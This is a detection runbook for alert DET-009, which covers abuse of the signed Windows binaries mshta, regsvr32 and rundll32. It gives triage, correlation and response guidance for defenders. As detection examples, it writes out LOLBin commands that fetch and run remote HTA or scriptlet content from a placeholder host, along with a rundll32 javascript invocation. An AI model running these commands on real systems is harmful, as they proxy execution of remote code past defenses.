# DET-009 — Suspicious LOLBin Execution

## Alert Description

This detection identifies suspicious use of legitimate, signed Windows binaries that are commonly abused for proxy execution, script execution, remote content retrieval, or defense evasion.

The initial DET-009 coverage focuses on:

- `mshta.exe`
- `regsvr32.exe`
- `rundll32.exe`

These binaries are legitimate Windows components and may appear during normal administration, software installation, configuration, or troubleshooting. However, adversaries frequently abuse them because they are trusted by the operating system and may blend into normal activity.

DET-009 should therefore be treated as a **high-priority living-off-the-land execution signal requiring command-line and process-context validation**, not automatic proof of compromise.

---

## Detection Objective

Identify suspicious execution patterns involving commonly abused Windows signed binaries.

The current Detection-as-Code logic is conceptually:

```text
Trusted Windows binary
        +
suspicious command-line pattern
        =
DET-009 match
```

Examples include:

```text
mshta.exe https://example.invalid/payload.hta
```

```text
regsvr32.exe /s /n /u /i:https://example.invalid/file.sct scrobj.dll
```

```text
rundll32.exe javascript:...
```

---

## MITRE ATT&CK Mapping

### T1218 — System Binary Proxy Execution

Adversaries may abuse trusted system binaries to proxy execution of malicious code.

Relevant sub-techniques include:

- **T1218.005 — Mshta**
- **T1218.010 — Regsvr32**
- **T1218.011 — Rundll32**

### Primary Tactic

- Defense Evasion

Depending on the command and follow-on activity, these binaries may also support:

- Execution
- Persistence
- Command and Control

---

## Relevant Telemetry

DET-009 is designed primarily around process-creation telemetry.

Useful sources include:

- Windows Security Event ID 4688;
- Sysmon Event ID 1;
- EDR process telemetry;
- PowerShell or script logs where relevant.

Important fields may include:

- `Image`
- `CommandLine`
- `ParentImage`
- `ParentCommandLine`
- `User`
- `Computer`
- `ProcessId`
- `ParentProcessId`
- hashes
- signer information
- timestamp

---

## Initial Triage

When DET-009 triggers, collect and review:

1. Hostname
2. User account
3. Executed binary
4. Full command line
5. Parent process
6. Parent command line
7. Process ID and parent PID
8. Timestamp
9. Referenced URL, script, DLL, or file
10. File hash where applicable
11. Digital signature
12. Network connections
13. Child processes
14. Related PowerShell or script activity
15. EDR alerts
16. Persistence or credential-access activity
17. Similar activity across other endpoints

---

## Key Questions

The analyst should determine:

- Which LOLBin executed?
- What exact command-line arguments were supplied?
- Is the invocation pattern expected?
- What process launched the binary?
- Did the command reference a remote URL?
- Did it execute script content?
- Did it load a DLL or scriptlet?
- Is the referenced file known and trusted?
- Did the process create child processes?
- Did network activity occur?
- Was the activity part of approved administration?
- Did suspicious activity follow?

---

## Why LOLBins Matter

Living-off-the-land binaries are valuable to attackers because they are:

- already present on Windows systems;
- digitally signed;
- commonly trusted;
- familiar to administrators;
- less likely to stand out than an unknown executable.

A suspicious attack chain may resemble:

```text
Initial compromise
        ↓
trusted Windows binary
        ↓
proxy execution
        ↓
payload execution
        ↓
defense evasion
```

The binary itself is not the problem. The invocation context is.

---

# Mshta Analysis

## `mshta.exe`

`mshta.exe` is a legitimate Microsoft utility used to execute HTML Applications (HTA).

Adversaries may abuse it to execute:

- remote HTA files;
- JavaScript;
- VBScript;
- script-based payloads.

### Higher-Risk Patterns

```text
mshta.exe http://...
```

```text
mshta.exe https://...
```

```text
mshta.exe javascript:...
```

```text
mshta.exe vbscript:...
```

Example:

```text
mshta.exe https://example.invalid/payload.hta
```

This should receive more scrutiny than ordinary local administrative use.

---

## Mshta Parent-Process Analysis

Higher-risk parent processes may include:

```text
winword.exe
excel.exe
outlook.exe
powershell.exe
cmd.exe
wscript.exe
cscript.exe
unknown executable
```

Example:

```text
winword.exe
        ↓
mshta.exe
        ↓
remote HTA
```

This chain can indicate document-driven execution.

---

# Regsvr32 Analysis

## `regsvr32.exe`

`regsvr32.exe` is a legitimate Windows utility used to register and unregister COM DLLs.

It can be abused for proxy execution.

A suspicious pattern may include:

```text
/i:http
```

or:

```text
/i:https
```

and:

```text
scrobj.dll
```

Example:

```text
regsvr32.exe /s /n /u /i:https://example.invalid/file.sct scrobj.dll
```

This pattern should be treated as high priority unless explicitly authorized.

---

## Regsvr32 Context

Investigate:

- whether the command references remote content;
- whether `scrobj.dll` is involved;
- whether the execution was part of software installation;
- the parent process;
- any network retrieval;
- child or follow-on processes.

Do not flag routine DLL registration automatically.

---

# Rundll32 Analysis

## `rundll32.exe`

`rundll32.exe` is a legitimate Windows utility used to execute exported functions from DLLs.

It is widely used by Windows and third-party applications, so broad detection would create excessive false positives.

Higher-risk patterns may include:

```text
javascript:
```

```text
mshtml
```

```text
url.dll
```

or unusual DLL paths.

Example:

```text
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ..."
```

Such behavior requires investigation.

---

## Rundll32 Path Analysis

Pay additional attention when the referenced DLL or payload resides in:

```text
C:\Users\Public
C:\Temp
%TEMP%
%APPDATA%
%LOCALAPPDATA%
Downloads
```

Example:

```text
rundll32.exe C:\Users\Public\unknown.dll,EntryPoint
```

A user-writable path combined with unusual execution substantially increases risk.

---

## Parent-Process Analysis

Parent process is critical.

Expected contexts may include:

- Windows components;
- control panel operations;
- software installers;
- enterprise management tools.

Higher-risk contexts include:

```text
winword.exe
excel.exe
outlook.exe
powershell.exe
cmd.exe
mshta.exe
wscript.exe
cscript.exe
unknown executable
```

Example:

```text
outlook.exe
        ↓
cmd.exe
        ↓
mshta.exe https://...
```

This should receive high investigative priority.

---

## Command-Line Analysis

Do not alert on the binary name alone.

Analyze:

```text
Image
+
CommandLine
+
ParentImage
+
Referenced resource
```

For example:

```text
rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl
```

may be legitimate.

Whereas:

```text
mshta.exe https://example.invalid/payload.hta
```

is substantially more suspicious.

---

## URL and Network Investigation

If the command references a URL, investigate:

- domain reputation;
- IP address;
- DNS resolution;
- destination ASN;
- hosting provider;
- internal prevalence;
- whether other endpoints contacted the same domain;
- whether content was downloaded.

Useful telemetry includes:

- proxy logs;
- firewall logs;
- DNS;
- EDR network events;
- web-filter telemetry.

---

## File Investigation

If the command references a local DLL, script, HTA, or SCT file, collect:

```text
filename
full path
SHA256
size
creation time
modification time
digital signature
```

Determine:

- what process created it;
- whether it was downloaded;
- whether it is signed;
- whether it is prevalent;
- whether it executed elsewhere.

---

## Child-Process Investigation

Determine whether the LOLBin launched additional processes.

Potentially suspicious children include:

```text
powershell.exe
cmd.exe
rundll32.exe
regsvr32.exe
mshta.exe
wscript.exe
cscript.exe
unknown executable
```

Example:

```text
mshta.exe
        ↓
powershell.exe
        ↓
download / execution
```

This chain is more significant than isolated `mshta.exe`.

---

## PowerShell Correlation

Correlate with earlier detections.

Example:

```text
DET-001
Encoded PowerShell
        ↓
DET-009
LOLBin execution
```

or:

```text
DET-002
PowerShell download
        ↓
DET-009
mshta / rundll32 execution
```

Cross-detection correlation substantially increases confidence.

---

## Defender / EDR Correlation

Review whether security controls were modified nearby.

Example:

```text
DET-006
Defender weakened
        ↓
DET-009
signed binary proxy execution
```

This sequence should receive high priority.

---

## Persistence Follow-Up

Determine whether LOLBin execution was followed by persistence.

Look for:

- scheduled tasks;
- services;
- startup entries;
- registry Run keys;
- WMI persistence;
- local administrator changes.

Example:

```text
DET-009
LOLBin execution
        ↓
DET-007
scheduled task creation
```

---

## Credential-Access Follow-Up

Review for:

- LSASS access;
- credential dumping;
- SAM or SECURITY hive access;
- browser credential theft.

Example:

```text
DET-009
proxy execution
        ↓
DET-008
LSASS access
```

This should be treated as a strong escalation pattern.

---

## Lateral Movement Follow-Up

Investigate whether the execution was followed by:

- RDP;
- SMB;
- WinRM;
- WMI;
- remote services;
- administrative-share access;
- successful logons to additional systems.

Trusted binaries may be used as part of multi-stage post-exploitation chains.

---

## Escalation Indicators

Escalate when one or more of the following are present:

- `mshta.exe` retrieves remote content;
- `regsvr32.exe` references remote scriptlet content;
- `rundll32.exe` uses unusual script-like invocation;
- referenced payload resides in a user-writable path;
- parent process is Office or another unusual application;
- execution was preceded by a download;
- the user did not initiate the activity;
- the command is obfuscated;
- suspicious child processes execute;
- network connections follow;
- Defender or EDR was weakened;
- persistence is created;
- credential access follows;
- similar behavior occurs across multiple endpoints.

---

## False Positives

Potential legitimate causes include:

- software installation;
- DLL registration;
- Windows control-panel operations;
- application maintenance;
- approved administration;
- enterprise management tooling;
- troubleshooting.

To close as benign, validate:

```text
Binary
+
Command line
+
Parent process
+
Referenced file/resource
+
Business purpose
+
Expected follow-on behavior
```

---

## Suggested Triage Flow

```text
DET-009 Alert
     |
     v
Identify LOLBin
     |
     v
Review full command line
     |
     v
Review parent process
     |
     v
Identify URL / DLL / script
     |
     v
Is invocation expected?
     |
     +---- Yes ----------------------+
     |                               |
     |                      Validate business context
     |
     v
Investigate file / domain
     |
     v
Check child processes
     |
     v
Check network activity
     |
     v
Review persistence / credential access
     |
     v
Determine benign vs suspicious
```

---

## Analyst Decision

### Benign / Expected

Close as benign when:

- the command is part of authorized activity;
- the parent process is expected;
- referenced files or resources are trusted;
- the execution pattern is normal for the environment;
- no suspicious follow-on behavior exists.

Document the business justification.

### Suspicious

Escalate when:

- the invocation is unusual;
- remote content is referenced;
- a user-writable file is executed;
- the parent process is suspicious;
- the command cannot be explained;
- related endpoint or network alerts exist.

### Confirmed or Probable Compromise

Treat as probable or confirmed compromise when LOLBin execution is associated with:

- malicious payload execution;
- command-and-control;
- persistence;
- credential dumping;
- defense evasion;
- lateral movement;
- unauthorized remote content retrieval.

Potential response actions may include:

- isolate affected endpoints;
- terminate malicious processes;
- quarantine referenced files;
- block malicious domains/IPs;
- remove persistence;
- restore security controls;
- reset compromised credentials where justified;
- hunt for the same invocation across the environment;
- preserve forensic evidence;
- escalate according to incident-response procedures.

---

## Evidence to Preserve

Collect and preserve:

- process-creation event;
- Image;
- CommandLine;
- ParentImage;
- ParentCommandLine;
- user;
- hostname;
- timestamp;
- process ID;
- parent PID;
- referenced URL;
- referenced DLL/script/HTA/SCT;
- hashes;
- signer information;
- DNS activity;
- network connections;
- child processes;
- PowerShell activity;
- Defender/EDR events;
- persistence indicators;
- credential-access events;
- related alerts;
- analyst timeline.

---

## Example Detection Scenario

### Process Event

```text
EventID:
4688

Image:
C:\Windows\System32\mshta.exe

CommandLine:
mshta.exe https://example.invalid/payload.hta

ParentImage:
C:\Windows\System32\cmd.exe

User:
LAB\test-user

Computer:
WIN11-LAB
```

### Detection Reason

```text
Trusted Windows binary
        +
remote HTA execution
        =
DET-009 match
```

### Expected Analyst Action

Investigate the parent process, URL, network activity, retrieved content, and any child processes or persistence created afterward.

---

## Detection Limitations

DET-009 intentionally covers a small subset of LOLBin abuse.

It may miss:

- other signed binaries;
- unconventional command-line syntax;
- renamed or copied system binaries;
- indirect execution paths;
- activity where process command-line telemetry is unavailable.

It may also produce false positives from legitimate administration and software operations.

Production implementations should expand coverage carefully and maintain environment-specific baselines.

---

## Detection Engineering Notes

DET-009 adds dedicated **living-off-the-land / signed binary proxy execution** coverage.

Current portfolio coverage:

```text
DET-001 — Encoded PowerShell execution
DET-002 — PowerShell download behavior
DET-003 — Repeated authentication failures
DET-004 — Failures followed by successful authentication
DET-005 — Local administrator privilege assignment
DET-006 — Defender protection modification
DET-007 — Scheduled task creation
DET-008 — Suspicious LSASS access
DET-009 — Suspicious LOLBin execution
```

The project now demonstrates detections across:

- Execution
- Credential Access
- Persistence
- Privilege Escalation
- Defense Evasion
- Authentication analytics
- Living-off-the-land behavior

Positive and negative test fixtures should remain version-controlled so future matcher changes cannot silently broaden or break DET-009.

---

## Recommended Production Refinement

A production-quality detector should not alert on every invocation of:

```text
mshta.exe
regsvr32.exe
rundll32.exe
```

Prefer context-rich logic combining:

```text
Binary
+
suspicious argument
+
remote content
+
user-writable path
+
unusual parent
+
rare execution
```

This improves precision and reduces false positives.

---

## Final Analyst Principle

> A trusted Windows binary can still be used for untrusted execution. Its security significance depends on how it was invoked, what resource or code it handled, what launched it, and what behavior followed.
